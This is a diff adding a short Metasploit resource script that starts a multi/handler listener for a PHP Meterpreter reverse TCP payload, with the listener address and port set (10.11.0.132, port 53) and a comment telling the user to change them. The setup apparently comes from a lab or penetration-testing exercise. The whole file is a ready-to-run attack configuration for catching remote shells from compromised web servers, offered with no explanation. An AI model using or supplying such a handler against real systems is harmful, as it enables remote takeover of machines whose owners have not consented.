@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload php/meterpreter_reverse_tcp 
+##### CHANGE THESE VALUES ####
+set LHOST 10.11.0.132
+set LPORT 53 
+exploit
